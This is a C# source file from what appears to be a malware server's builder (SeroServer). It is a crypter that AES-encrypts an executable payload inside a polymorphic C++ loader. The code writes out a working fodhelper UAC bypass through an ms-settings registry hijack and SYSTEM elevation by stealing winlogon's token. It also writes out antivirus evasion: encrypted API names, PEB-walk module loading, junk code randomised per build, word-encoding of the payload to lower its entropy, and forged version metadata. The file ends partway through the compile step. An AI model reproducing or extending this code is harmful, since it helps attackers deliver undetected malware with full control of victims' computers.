using System.IO;
using System.IO.Compression;
using System.Text;

namespace SeroServer.Builder;

/// <summary>Icon + version info to embed in the C++ loader via rc.exe.</summary>
public record LoaderMetadata(
    string? ProductName,
    string? CompanyName,
    string? FileVersion,
    string? ProductVersion,
    string? FileDescription,
    string? Copyright);

/// <summary>
/// Polymorphic AES-256-CBC crypter.
/// Generates a C++ native loader per build with all sensitive strings AES-encrypted.
/// </summary>
public static class CrypterBuilder
{
    // ── UAC bypass + SYSTEM elevation (injected when uacBypass=true) ──────────
    // 1. fodhelper bypass via ms-settings registry hijack
    // 2. winlogon token steal for SYSTEM — all strings/APIs AES-encrypted, dynamic load
    private const string UacPreamble = @"
#include <shellapi.h>
#include <tlhelp32.h>
";
    private const string UacFunc = @"
// ── narrow AES-decrypted string → wide (ASCII only) ─────────────────────────
static void _N2W(const char*n,wchar_t*w,int max){int i=0;while(n[i]&&i<max-1){w[i]=(wchar_t)(unsigned char)n[i];i++;}w[i]=0;}
// ── load module: PEB walk first, LoadLibraryA fallback ───────────────────────
static HMODULE _Mod(const unsigned char*enc,int len){
    char*nm=AesDecStr(enc,len);if(!nm)return NULL;
    int n=0;while(nm[n])n++;
    HMODULE h=PebGetMod(nm,n);
    if(!h){char*k32=AesDecStr(S_K32,sizeof(S_K32));int kl=0;while(k32[kl])kl++;
        HMODULE hk=PebGetMod(k32,kl);HeapFree(GetProcessHeap(),0,k32);
        if(hk){typedef HMODULE(WINAPI*fnL_t)(LPCSTR);fnL_t fnL=(fnL_t)PeGetProc(hk,""LoadLibraryA"");if(fnL)h=fnL(nm);}}
    HeapFree(GetProcessHeap(),0,nm);return h;}
// ── resolve proc by AES-encrypted name ───────────────────────────────────────
static FARPROC _Fn(HMODULE hm,const unsigned char*enc,int len){
    char*nm=AesDecStr(enc,len);if(!nm)return NULL;
    FARPROC f=PeGetProc(hm,nm);HeapFree(GetProcessHeap(),0,nm);return f;}
// ── elevation helpers ─────────────────────────────────────────────────────────
static bool _IsElevated(){
    HMODULE hAdv=_Mod(S_ADV,sizeof(S_ADV));if(!hAdv)return false;
    typedef BOOL(WINAPI*fnOPT_t)(HANDLE,DWORD,PHANDLE);
    typedef BOOL(WINAPI*fnGTI_t)(HANDLE,TOKEN_INFORMATION_CLASS,LPVOID,DWORD,PDWORD);
    fnOPT_t fOPT=(fnOPT_t)_Fn(hAdv,S_OPT,sizeof(S_OPT));
    fnGTI_t fGTI=(fnGTI_t)_Fn(hAdv,S_GTI,sizeof(S_GTI));
    if(!fOPT||!fGTI)return false;
    HANDLE ht=NULL;BOOL el=FALSE;DWORD sz=0;
    if(!fOPT(GetCurrentProcess(),TOKEN_QUERY,&ht))return false;
    TOKEN_ELEVATION te={0};
    if(fGTI(ht,TokenElevation,&te,sizeof(te),&sz))el=te.TokenIsElevated;
    CloseHandle(ht);return el!=FALSE;}
static bool _IsSystem(){
    HMODULE hAdv=_Mod(S_ADV,sizeof(S_ADV));if(!hAdv)return false;
    typedef BOOL(WINAPI*fnOPT_t)(HANDLE,DWORD,PHANDLE);
    typedef BOOL(WINAPI*fnGTI_t)(HANDLE,TOKEN_INFORMATION_CLASS,LPVOID,DWORD,PDWORD);
    typedef BOOL(WINAPI*fnIWKS_t)(PSID,WELL_KNOWN_SID_TYPE);
    fnOPT_t fOPT=(fnOPT_t)_Fn(hAdv,S_OPT,sizeof(S_OPT));
    fnGTI_t fGTI=(fnGTI_t)_Fn(hAdv,S_GTI,sizeof(S_GTI));
    fnIWKS_t fIWKS=(fnIWKS_t)_Fn(hAdv,S_IWKS,sizeof(S_IWKS));
    if(!fOPT||!fGTI||!fIWKS)return false;
    HANDLE ht=NULL;if(!fOPT(GetCurrentProcess(),TOKEN_QUERY,&ht))return false;
    BYTE buf[256]={};DWORD sz=0;bool ret=false;
    if(fGTI(ht,TokenUser,buf,sizeof(buf),&sz)){TOKEN_USER*tu=(TOKEN_USER*)buf;ret=fIWKS(tu->User.Sid,WinLocalSystemSid)!=0;}
    CloseHandle(ht);return ret;}
static bool _FodBypass(){
    HMODULE hAdv=_Mod(S_ADV,sizeof(S_ADV));
    HMODULE hSh=_Mod(S_SH32,sizeof(S_SH32));
    HMODULE hK32=_Mod(S_K32,sizeof(S_K32));
    if(!hAdv||!hSh||!hK32)return false;
    typedef LONG(WINAPI*fnRCKX_t)(HKEY,LPCWSTR,DWORD,LPWSTR,DWORD,REGSAM,const LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD);
    typedef LONG(WINAPI*fnRSVX_t)(HKEY,LPCWSTR,DWORD,DWORD,const BYTE*,DWORD);
    typedef LONG(WINAPI*fnRCK_t)(HKEY);
    typedef LONG(WINAPI*fnRDKW_t)(HKEY,LPCWSTR);
    typedef BOOL(WINAPI*fnSEEX_t)(SHELLEXECUTEINFOW*);
    typedef DWORD(WINAPI*fnGSDW_t)(LPWSTR,UINT);
    typedef DWORD(WINAPI*fnGMFW2_t)(HMODULE,LPWSTR,DWORD);
    fnRCKX_t fRCKX=(fnRCKX_t)_Fn(hAdv,S_RCKX,sizeof(S_RCKX));
    fnRSVX_t fRSVX=(fnRSVX_t)_Fn(hAdv,S_RSVX,sizeof(S_RSVX));
    fnRCK_t  fRCK=(fnRCK_t)_Fn(hAdv,S_RCK,sizeof(S_RCK));
    fnRDKW_t fRDKW=(fnRDKW_t)_Fn(hAdv,S_RDKW,sizeof(S_RDKW));
    fnSEEX_t fSEEX=(fnSEEX_t)_Fn(hSh,S_SEEX,sizeof(S_SEEX));
    fnGSDW_t fGSDW=(fnGSDW_t)_Fn(hK32,S_GSDW,sizeof(S_GSDW));
    fnGMFW2_t fGMFW2=(fnGMFW2_t)_Fn(hK32,S_GMFW,sizeof(S_GMFW));
    if(!fRCKX||!fRSVX||!fRCK||!fRDKW||!fSEEX||!fGSDW||!fGMFW2)return false;
    wchar_t self[MAX_PATH]={};fGMFW2(NULL,self,MAX_PATH);
    char*nKey=AesDecStr(S_MSCMD,sizeof(S_MSCMD));wchar_t wKey[64]={};_N2W(nKey,wKey,64);HeapFree(GetProcessHeap(),0,nKey);
    char*nDlg=AesDecStr(S_DELEGEX,sizeof(S_DELEGEX));wchar_t wDlg[20]={};_N2W(nDlg,wDlg,20);HeapFree(GetProcessHeap(),0,nDlg);
    HKEY hk=NULL;
    if(fRCKX(HKEY_CURRENT_USER,wKey,0,NULL,0,KEY_ALL_ACCESS,NULL,&hk,NULL)!=ERROR_SUCCESS)return false;
    {int i=0;while(self[i])i++;
    fRSVX(hk,NULL,0,REG_SZ,(BYTE*)self,(DWORD)((i+1)*sizeof(wchar_t)));}
    fRSVX(hk,wDlg,0,REG_SZ,(BYTE*)L"""",sizeof(wchar_t));
    fRCK(hk);
    wchar_t fod[MAX_PATH]={};fGSDW(fod,MAX_PATH);
    char*nFod=AesDecStr(S_FODHLP,sizeof(S_FODHLP));wchar_t wFod[20]={};_N2W(nFod,wFod,20);HeapFree(GetProcessHeap(),0,nFod);
    {int i=0;while(fod[i])i++;fod[i++]=L'\\';int j=0;while(wFod[j]){fod[i+j]=wFod[j];j++;}fod[i+j]=0;}
    SHELLEXECUTEINFOW sei={0};sei.cbSize=sizeof(sei);sei.fMask=SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb=L""open"";sei.lpFile=fod;sei.nShow=SW_HIDE;
    fSEEX(&sei);Sleep(3000);
    char*nCmd=AesDecStr(S_MSCMD,sizeof(S_MSCMD));wchar_t wCmd[64]={};_N2W(nCmd,wCmd,64);HeapFree(GetProcessHeap(),0,nCmd);
    char*nOpn=AesDecStr(S_MSOPEN,sizeof(S_MSOPEN));wchar_t wOpn[56]={};_N2W(nOpn,wOpn,56);HeapFree(GetProcessHeap(),0,nOpn);
    char*nSh=AesDecStr(S_MSSHELL,sizeof(S_MSSHELL));wchar_t wSh[48]={};_N2W(nSh,wSh,48);HeapFree(GetProcessHeap(),0,nSh);
    char*nBs=AesDecStr(S_MSBASE,sizeof(S_MSBASE));wchar_t wBs[40]={};_N2W(nBs,wBs,40);HeapFree(GetProcessHeap(),0,nBs);
    fRDKW(HKEY_CURRENT_USER,wCmd);fRDKW(HKEY_CURRENT_USER,wOpn);
    fRDKW(HKEY_CURRENT_USER,wSh);fRDKW(HKEY_CURRENT_USER,wBs);
    return true;}
static bool _EnableDebug(HMODULE hAdv){
    typedef BOOL(WINAPI*fnOPT_t)(HANDLE,DWORD,PHANDLE);
    typedef BOOL(WINAPI*fnLPVW_t)(LPCWSTR,LPCWSTR,PLUID);
    typedef BOOL(WINAPI*fnATP_t)(HANDLE,BOOL,PTOKEN_PRIVILEGES,DWORD,PTOKEN_PRIVILEGES,PDWORD);
    fnOPT_t fOPT=(fnOPT_t)_Fn(hAdv,S_OPT,sizeof(S_OPT));
    fnLPVW_t fLPVW=(fnLPVW_t)_Fn(hAdv,S_LPVW,sizeof(S_LPVW));
    fnATP_t fATP=(fnATP_t)_Fn(hAdv,S_ATP,sizeof(S_ATP));
    if(!fOPT||!fLPVW||!fATP)return false;
    HANDLE ht=NULL;if(!fOPT(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&ht))return false;
    char*nDbg=AesDecStr(S_SEDEBUG,sizeof(S_SEDEBUG));wchar_t wDbg[20]={};_N2W(nDbg,wDbg,20);HeapFree(GetProcessHeap(),0,nDbg);
    LUID luid={0};
    if(!fLPVW(NULL,wDbg,&luid)){CloseHandle(ht);return false;}
    TOKEN_PRIVILEGES tp={0};tp.PrivilegeCount=1;
    tp.Privileges[0].Luid=luid;tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    fATP(ht,FALSE,&tp,sizeof(tp),NULL,NULL);
    bool ok=(GetLastError()==ERROR_SUCCESS);CloseHandle(ht);return ok;}
static bool _ElevateToSystem(){
    HMODULE hAdv=_Mod(S_ADV,sizeof(S_ADV));
    HMODULE hK32=_Mod(S_K32,sizeof(S_K32));
    if(!hAdv||!hK32)return false;
    if(!_EnableDebug(hAdv))return false;
    typedef HANDLE(WINAPI*fnCTS_t)(DWORD,DWORD);
    typedef BOOL(WINAPI*fnP32F_t)(HANDLE,LPPROCESSENTRY32W);
    typedef BOOL(WINAPI*fnP32N_t)(HANDLE,LPPROCESSENTRY32W);
    typedef HANDLE(WINAPI*fnOPR_t)(DWORD,BOOL,DWORD);
    typedef BOOL(WINAPI*fnOPT_t)(HANDLE,DWORD,PHANDLE);
    typedef BOOL(WINAPI*fnDTEX_t)(HANDLE,DWORD,LPSECURITY_ATTRIBUTES,SECURITY_IMPERSONATION_LEVEL,TOKEN_TYPE,PHANDLE);
    typedef BOOL(WINAPI*fnCPWT_t)(HANDLE,DWORD,LPCWSTR,LPWSTR,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
    typedef DWORD(WINAPI*fnGMFW2_t)(HMODULE,LPWSTR,DWORD);
    fnCTS_t  fCTS=(fnCTS_t)_Fn(hK32,S_CTS,sizeof(S_CTS));
    fnP32F_t fP32F=(fnP32F_t)_Fn(hK32,S_P32F,sizeof(S_P32F));
    fnP32N_t fP32N=(fnP32N_t)_Fn(hK32,S_P32N,sizeof(S_P32N));
    fnOPR_t  fOPR=(fnOPR_t)_Fn(hK32,S_OPR,sizeof(S_OPR));
    fnOPT_t  fOPT=(fnOPT_t)_Fn(hAdv,S_OPT,sizeof(S_OPT));
    fnDTEX_t fDTEX=(fnDTEX_t)_Fn(hAdv,S_DTEX,sizeof(S_DTEX));
    fnCPWT_t fCPWT=(fnCPWT_t)_Fn(hAdv,S_CPWT,sizeof(S_CPWT));
    fnGMFW2_t fGMFW2=(fnGMFW2_t)_Fn(hK32,S_GMFW,sizeof(S_GMFW));
    if(!fCTS||!fP32F||!fP32N||!fOPR||!fOPT||!fDTEX||!fCPWT||!fGMFW2)return false;
    char*nWL=AesDecStr(S_WINLOGON,sizeof(S_WINLOGON));wchar_t wWL[16]={};_N2W(nWL,wWL,16);HeapFree(GetProcessHeap(),0,nWL);
    HANDLE hs=fCTS(TH32CS_SNAPPROCESS,0);if(hs==INVALID_HANDLE_VALUE)return false;
    PROCESSENTRY32W pe={0};pe.dwSize=sizeof(pe);DWORD pid=0;
    if(fP32F(hs,&pe)){do{
        int i=0;bool eq=true;
        while(wWL[i]||pe.szExeFile[i]){
            wchar_t a=wWL[i],b=pe.szExeFile[i];
            if(a>='A'&&a<='Z')a+=32;if(b>='A'&&b<='Z')b+=32;
            if(a!=b){eq=false;break;}i++;}
        if(eq){pid=pe.th32ProcessID;break;}
    }while(fP32N(hs,&pe));}
    CloseHandle(hs);if(!pid)return false;
    HANDLE hp=fOPR(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,pid);if(!hp)return false;
    HANDLE ht=NULL;
    if(!fOPT(hp,TOKEN_DUPLICATE|TOKEN_QUERY,&ht)){CloseHandle(hp);return false;}
    HANDLE hd=NULL;
    if(!fDTEX(ht,TOKEN_ALL_ACCESS,NULL,SecurityImpersonation,TokenPrimary,&hd)){CloseHandle(ht);CloseHandle(hp);return false;}
    wchar_t self[MAX_PATH]={};fGMFW2(NULL,self,MAX_PATH);
    STARTUPINFOW si={0};si.cb=sizeof(si);PROCESS_INFORMATION pi={0};
    bool ok=fCPWT(hd,LOGON_WITH_PROFILE,NULL,self,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)!=0;
    if(ok){CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}
    CloseHandle(hd);CloseHandle(ht);CloseHandle(hp);return ok;}
";
    private const string UacCall = @"
    if(!_IsElevated()){_FodBypass();TerminateProcess(GetCurrentProcess(),0);return 0;}
    if(!_IsSystem()){_ElevateToSystem();TerminateProcess(GetCurrentProcess(),0);return 0;}
";

    public static async Task ApplyAsync(
        string exePath,
        Action<string> log,
        string? iconPath = null,
        LoaderMetadata? metadata = null,
        bool uacBypass = false)
    {
        var cppStubSrc = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Stubs", "loader.cpp");
        if (!File.Exists(cppStubSrc))
        {
            var dir = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
            while (dir != null)
            {
                var cand = Path.Combine(dir.FullName, "Stubs", "loader.cpp");
                if (File.Exists(cand)) { cppStubSrc = cand; break; }
                dir = dir.Parent;
            }
        }
        if (!File.Exists(cppStubSrc))
        {
            log("[!] Crypter: loader.cpp not found.");
            return;
        }
        log("[*] Crypter: C++ native loader...");
        bool _ok = await ApplyCppAsync(exePath, cppStubSrc, log, iconPath, metadata, uacBypass);
        if (!_ok) log("[!] Crypter: C++ build failed. Make sure MSVC (cl.exe) is installed.");
    }


    // ── 256 English words for low-entropy payload encoding ─────────────────────
    // Each byte 0-255 maps to a word. Shuffled per build for polymorphism.
    // Shannon entropy drops from ~8.0 bits/byte (raw AES) to ~4.2 bits/byte (ASCII text).
    // Mixed word lengths (3–6 chars) — looks like natural text, harder to fingerprint
    private static readonly string[] MasterWordList =
    [
        // 3-letter (0–31)
        "ace","act","age","aid","aim","air","all","ant","any","arc","arm","art","ash","ask","awe","axe",
        "bad","bag","ban","bar","bat","bay","bed","bet","big","bit","bow","box","boy","bud","bug","bus",
        // 4-letter (32–127)
        "able","acid","also","area","army","atom","away","back","bake","ball","band","bank","barn","base","bath","bear",
        "beat","bell","belt","bend","bird","bite","blow","blue","body","bold","bolt","bone","book","born","burn","cage",
        "cake","calm","card","care","cast","cave","cell","chip","city","clay","club","clue","coal","coat","code","coil",
        "cold","comb","cook","cool","cope","cord","core","corn","cost","crew","crop","cure","curl","dare","dark","data",
        "date","dead","deal","dear","deck","deep","deny","desk","dial","dice","diet","dirt","dish","disk","dome","door",
        "dose","down","drag","draw","drip","drop","drum","dust","duty","each","earn","easy","edit","emit","even","exam",
        // 5-letter (128–207)
        "about","above","after","angry","blade","blank","blast","blend","blind","block","blood","bloom","bound","brace","brand","brave",
        "bread","brick","bride","brief","bring","brisk","broad","brook","brush","build","burnt","chain","chair","chalk","chest","chief",
        "child","chunk","clash","clasp","class","cliff","climb","cling","clock","close","cloth","cloud","clump","coach","coast","craft",
        "crank","crash","crisp","cross","crowd","crown","crush","curve","cycle","daily","dance","diner","doubt","dread","drink","drive",
        "dwarf","eager","eagle","early","earth","elbow","ember","empty","enemy","enjoy","enter","event","extra","fable","facet","faith",
        // 6-letter (208–239)
        "absent","active","almost","always","anchor","animal","arcade","archer","ardent","artist","barrel","battle","beauty","better","castle","cellar",
        "circle","clever","corner","cotton","course","covert","custom","damage","debate","decide","divide","dollar","domain","donate","double","fallen",
        // back to 5-letter (240–255)
        "false","fancy","fatal","feast","fence","fetch","fever","fiber","field","final","fixed","flame","flask","fleet","flesh","flood",
    ];

    /// <summary>
    /// Encode encrypted bytes as English words, separator alternates between ' ' and '\n'
    /// at random line-lengths (6–20 words) so the overlay reads like prose, not one long blob.
    /// </summary>
    private static (string encoded, string[] shuffledList) WordEncode(byte[] data, Random rnd)
    {
        var shuffled = MasterWordList.ToArray();
        for (int i = shuffled.Length - 1; i > 0; i--)
        {
            int j = rnd.Next(i + 1);
            (shuffled[i], shuffled[j]) = (shuffled[j], shuffled[i]);
        }
        var sb = new StringBuilder(data.Length * 7);
        for (int i = 0; i < data.Length; i++)
        {
            sb.Append(shuffled[data[i]]);
            sb.Append('\n');
        }
        return (sb.ToString(), shuffled);
    }

    /// <summary>Generates C++ array literal for the shuffled wordlist.</summary>
    private static string WordListToCpp(string[] shuffled)
    {
        var sb = new StringBuilder("static const char* WL[256] = {");
        for (int i = 0; i < 256; i++)
        {
            if (i > 0) sb.Append(',');
            if (i % 16 == 0) sb.Append("\n    ");
            sb.Append('"').Append(shuffled[i]).Append('"');
        }
        sb.Append("\n};");
        return sb.ToString();
    }

    // ── C++ native loader path ────────────────────────────────────────────────
    // AES-256-CBC + word-encoded overlay for low entropy. Magic: ^CPPL0DR
    // All API names AES-encrypted in generated source, loaded via GetProcAddress.
    private static string RandId(Random r, int len = 8)
    {
        const string chars = "abcdefghijklmnopqrstuvwxyz";
        return new string(Enumerable.Range(0, len).Select(_ => chars[r.Next(chars.Length)]).ToArray());
    }

    private static async Task<bool> ApplyCppAsync(
        string exePath, string stubSrc, Action<string> log,
        string? iconPath = null, LoaderMetadata? metadata = null, bool uacBypass = false)
    {
        try
        {
            var rnd = new Random();
            static string BL(byte[] d) => "{" + string.Join(",", d) + "}";

            // ── AES encrypt payload (no GZip) ─────────────────────────────────
            var payload = await File.ReadAllBytesAsync(exePath);
            using var aes = System.Security.Cryptography.Aes.Create();
            aes.KeySize = 256; aes.Mode = System.Security.Cryptography.CipherMode.CBC;
            aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
            aes.GenerateKey(); aes.GenerateIV();
            byte[] pKey = aes.Key, pIv = aes.IV;

            byte[] encrypted;
            using (var enc = aes.CreateEncryptor())
            using (var ms = new MemoryStream())
            using (var cs = new System.Security.Cryptography.CryptoStream(ms, enc, System.Security.Cryptography.CryptoStreamMode.Write))
            { cs.Write(payload); cs.FlushFinalBlock(); encrypted = ms.ToArray(); }
            log($"[*] Crypter (C++): {payload.Length / 1024.0:F0} KB → {encrypted.Length / 1024.0:F0} KB encrypted");

            // ── AES string key (split 3 ways, per-build random) ───────────────
            using var sAes = System.Security.Cryptography.Aes.Create();
            sAes.KeySize = 256; sAes.Mode = System.Security.Cryptography.CipherMode.CBC;
            sAes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
            sAes.GenerateKey(); sAes.GenerateIV();

            byte[] EncStr(string s)
            {
                var plain = Encoding.ASCII.GetBytes(s);
                using var e2 = sAes.CreateEncryptor();
                using var m2 = new MemoryStream();
                using var c2 = new System.Security.Cryptography.CryptoStream(m2, e2, System.Security.Cryptography.CryptoStreamMode.Write);
                c2.Write(plain); c2.FlushFinalBlock(); return m2.ToArray();
            }

            byte[] skA = sAes.Key[..11], skB = sAes.Key[11..22], skC = sAes.Key[22..];
            string sIvLit = BL(sAes.IV);

            // ── Generate junk C++ functions (dead code, different each build) ──
            var jNames = Enumerable.Range(0, 8).Select(_ => RandId(rnd, 9)).ToArray();
            // Each template[i] paired with jNames[i] — calls must match signatures exactly
            var junkDefs = string.Join("\n", new[]
            {
                $"static long long {jNames[0]}(long long x){{long long r=1;for(long long i=2;i<=(x%7)+2;i++)r*=i;return r;}}",
                $"static unsigned int {jNames[1]}(unsigned int s){{s^=s<<13;s^=s>>17;s^=s<<5;return s;}}",
                $"static double {jNames[2]}(double x){{return x<0.0?-x:x+(x*0.0001);}}",
                $"static int {jNames[3]}(int a,int b){{return a*b+(a^b)-(a&b)*2;}}",
                $"static unsigned long long {jNames[4]}(unsigned char*b,int n2){{unsigned long long h=0xcbf29ce484222325ULL;for(int i=0;i<n2;i++){{h^=(unsigned long long)b[i];h*=0x100000001b3ULL;}}return h;}}",
                $"static int {jNames[5]}(int*a,int n2){{int s=0;for(int i=0;i<n2;i++)s+=a[i]^(i*7+13);return s;}}",
                $"static unsigned int {jNames[6]}(unsigned int n2){{unsigned int r=0;while(n2){{r+=(n2&1u);n2>>=1;}}return r;}}",
                $"static long long {jNames[7]}(long long a,long long b){{long long t;while(b){{t=b;b=a%b;a=t;}}return a;}}",
            });
            // Calls shuffled in random order — same signatures
            var junkCalls = string.Join("\n    ",
                Enumerable.Range(0, 8).OrderBy(_ => rnd.Next()).Select(i => i switch {
                    0 => $"(void){jNames[0]}(2LL);",
                    1 => $"(void){jNames[1]}(1u);",
                    2 => $"(void){jNames[2]}(1.5);",
                    3 => $"(void){jNames[3]}(3,7);",
                    4 => $"{{unsigned char _jb[]={{1,2,3}};(void){jNames[4]}(_jb,3);}}",
                    5 => $"{{int _ja[]={{1,2,3}};(void){jNames[5]}(_ja,3);}}",
                    6 => $"(void){jNames[6]}(8u);",
                    7 => $"(void){jNames[7]}(12LL,8LL);",
                    _ => ""
                }));

            // ── Word-encode KEY+IV+PAYLOAD together — no raw bytes in overlay ─
            var combined = new byte[pKey.Length + pIv.Length + encrypted.Length];
            Buffer.BlockCopy(pKey, 0, combined, 0, pKey.Length);
            Buffer.BlockCopy(pIv, 0, combined, pKey.Length, pIv.Length);
            Buffer.BlockCopy(encrypted, 0, combined, pKey.Length + pIv.Length, encrypted.Length);
            var (wordPayload, shuffledWords) = WordEncode(combined, rnd);
            log($"[*] Crypter (C++): word-encoded {combined.Length} bytes (key+iv+payload) → {wordPayload.Length} chars (entropy ~3.5 bits/byte)");

            // ── Per-build random magic (no static signature) ─────────────────
            var cppMagic = new byte[8]; rnd.NextBytes(cppMagic);
            string cppMagicLit = "{" + string.Join(",", cppMagic.Select(b => "0x" + b.ToString("X2"))) + "}";

            // ── Fill in template ──────────────────────────────────────────────
            var src = await File.ReadAllTextAsync(stubSrc);
            src = src.Replace("{/*WORDLIST*/}",   WordListToCpp(shuffledWords))
                     .Replace("{/*JUNK_DEFS*/}",  junkDefs)
                     .Replace("{/*JUNK_CALLS*/}", junkCalls)
                     .Replace("{/*SKA*/}",  BL(skA))
                     .Replace("{/*SKB*/}",  BL(skB))
                     .Replace("{/*SKC*/}",  BL(skC))
                     .Replace("{/*SIV*/}",  sIvLit)
                     .Replace("{/*MAGIC*/}", cppMagicLit)
                     .Replace("{/*S_K32*/}", BL(EncStr("kernel32.dll")))
                     .Replace("{/*S_U32*/}", BL(EncStr("user32.dll")))
                     .Replace("{/*S_SLP*/}", BL(EncStr("Sleep")))
                     .Replace("{/*S_GTC*/}", BL(EncStr("GetTickCount")))
                     .Replace("{/*S_GSM*/}", BL(EncStr("GetSystemMetrics")))
                     .Replace("{/*S_GCP*/}", BL(EncStr("GetCursorPos")))
                     .Replace("{/*S_GMFW*/}",BL(EncStr("GetModuleFileNameW")))
                     .Replace("{/*S_GENV*/}",BL(EncStr("GetEnvironmentVariableW")))
                     .Replace("{/*S_CDIR*/}",BL(EncStr("CreateDirectoryW")))
                     .Replace("{/*S_CFW*/}", BL(EncStr("CreateFileW")))
                     .Replace("{/*S_RF*/}",  BL(EncStr("ReadFile")))
                     .Replace("{/*S_GFS*/}", BL(EncStr("GetFileSize")))
                     .Replace("{/*S_WF*/}",  BL(EncStr("WriteFile")))
                     .Replace("{/*S_CH*/}",  BL(EncStr("CloseHandle")))
                     .Replace("{/*S_CP*/}",  BL(EncStr("CreateProcessW")))
                     .Replace("{/*S_MBW*/}", BL(EncStr("MultiByteToWideChar")))
                     .Replace("{/*S_EXT*/}", BL(EncStr(".exe")))
                     .Replace("{/*S_LOCA*/}",BL(EncStr("LOCALAPPDATA")))
                     .Replace("{/*S_MWS*/}", BL(EncStr("Microsoft\\Windows")))
                     .Replace("{/*S_ADV*/}",      uacBypass ? BL(EncStr("advapi32.dll"))                                    : "0")
                     .Replace("{/*S_SH32*/}",     uacBypass ? BL(EncStr("shell32.dll"))                                     : "0")
                     .Replace("{/*S_OPT*/}",      uacBypass ? BL(EncStr("OpenProcessToken"))                                : "0")
                     .Replace("{/*S_ATP*/}",      uacBypass ? BL(EncStr("AdjustTokenPrivileges"))                           : "0")
                     .Replace("{/*S_DTEX*/}",     uacBypass ? BL(EncStr("DuplicateTokenEx"))                                : "0")
                     .Replace("{/*S_GTI*/}",      uacBypass ? BL(EncStr("GetTokenInformation"))                             : "0")
                     .Replace("{/*S_IWKS*/}",     uacBypass ? BL(EncStr("IsWellKnownSid"))                                  : "0")
                     .Replace("{/*S_LPVW*/}",     uacBypass ? BL(EncStr("LookupPrivilegeValueW"))                           : "0")
                     .Replace("{/*S_CPWT*/}",     uacBypass ? BL(EncStr("CreateProcessWithTokenW"))                         : "0")
                     .Replace("{/*S_RCK*/}",      uacBypass ? BL(EncStr("RegCloseKey"))                                     : "0")
                     .Replace("{/*S_RCKX*/}",     uacBypass ? BL(EncStr("RegCreateKeyExW"))                                 : "0")
                     .Replace("{/*S_RDKW*/}",     uacBypass ? BL(EncStr("RegDeleteKeyW"))                                   : "0")
                     .Replace("{/*S_RSVX*/}",     uacBypass ? BL(EncStr("RegSetValueExW"))                                  : "0")
                     .Replace("{/*S_SEEX*/}",     uacBypass ? BL(EncStr("ShellExecuteExW"))                                 : "0")
                     .Replace("{/*S_GSDW*/}",     uacBypass ? BL(EncStr("GetSystemDirectoryW"))                             : "0")
                     .Replace("{/*S_OPR*/}",      uacBypass ? BL(EncStr("OpenProcess"))                                     : "0")
                     .Replace("{/*S_CTS*/}",      uacBypass ? BL(EncStr("CreateToolhelp32Snapshot"))                        : "0")
                     .Replace("{/*S_P32F*/}",     uacBypass ? BL(EncStr("Process32FirstW"))                                 : "0")
                     .Replace("{/*S_P32N*/}",     uacBypass ? BL(EncStr("Process32NextW"))                                  : "0")
                     .Replace("{/*S_WINLOGON*/}", uacBypass ? BL(EncStr("winlogon.exe"))                                    : "0")
                     .Replace("{/*S_FODHLP*/}",   uacBypass ? BL(EncStr("fodhelper.exe"))                                   : "0")
                     .Replace("{/*S_MSCMD*/}",    uacBypass ? BL(EncStr("Software\\Classes\\ms-settings\\Shell\\Open\\command")) : "0")
                     .Replace("{/*S_MSOPEN*/}",   uacBypass ? BL(EncStr("Software\\Classes\\ms-settings\\Shell\\Open"))    : "0")
                     .Replace("{/*S_MSSHELL*/}",  uacBypass ? BL(EncStr("Software\\Classes\\ms-settings\\Shell"))          : "0")
                     .Replace("{/*S_MSBASE*/}",   uacBypass ? BL(EncStr("Software\\Classes\\ms-settings"))                 : "0")
                     .Replace("{/*S_DELEGEX*/}",  uacBypass ? BL(EncStr("DelegateExecute"))                                 : "0")
                     .Replace("{/*S_SEDEBUG*/}",  uacBypass ? BL(EncStr("SeDebugPrivilege"))                                : "0")
                     .Replace("{/*UAC_BYPASS_PREAMBLE*/}", uacBypass ? UacPreamble : "")
                     .Replace("{/*UAC_BYPASS_FUNC*/}",     uacBypass ? UacFunc    : "")
                     .Replace("{/*UAC_BYPASS_CALL*/}",     uacBypass ? UacCall    : "");

            // ── Compile ───────────────────────────────────────────────────────
            var tempDir  = Path.Combine(Path.GetTempPath(), "sero_cpp_" + Guid.NewGuid().ToString("N")[..8]);
            Directory.CreateDirectory(tempDir);
            var srcFile  = Path.Combine(tempDir, "loader.cpp");
            var outExe   = Path.Combine(tempDir, "loader.exe");
            await File.WriteAllTextAsync(srcFile, src);

            // ── Generate resource file (icon + version info) if requested ─────
            string resArg = "";
            if (iconPath != null || metadata != null)
            {
                var rcFile  = Path.Combine(tempDir, "loader.rc");
                var resFile = Path.Combine(tempDir, "loader.res");
                var rcContent = BuildRcContent(iconPath, metadata);
                await File.WriteAllTextAsync(rcFile, rcContent);

                // Compile .rc → .res via rc.exe (Windows SDK) or windres (MinGW)
                // rc.exe is found via PATH or next to cl.exe
                bool rcOk = await CompileRcFile(rcFile, resFile, log);
                if (rcOk)
                {
                    resArg = $" \"{resFile}\"";
                    log($"[*] Crypter (C++): Resources compiled (icon={iconPath != null}, metadata={metadata != null})");
                }
                else
                    log("[!] Crypter (C++): rc.exe not found or failed — icon/metadata not embedded in loader.");
            }

            var (compiler, isMsvc) = FindCppCompiler();
            if (string.IsNullOrEmpty(compiler))
            {
                log("[!] Crypter (C++): No C++ compiler found (MSVC or MinGW). Install VS Build Tools or MinGW.");
                try { Directory.Delete(tempDir, true); } catch { }
                return false;
            }
            log($"[*] Crypter (C++): Using {(isMsvc ? "MSVC" : "MinGW")} — {Path.GetFileName(compiler)}");

            System.Diagnostics.ProcessStartInfo psi;
            if (isMsvc)
            {
                var clDir  = Path.GetDirectoryName(compiler)!;
                var vcDir  = Path.GetFullPath(Path.Combine(clDir, "..", "..", "..", "..", "..", ".."));
                var vcvars = Path.Combine(vcDir, "Auxiliary", "Build", "vcvarsall.bat");

                string libs    = "bcrypt.lib kernel32.lib";
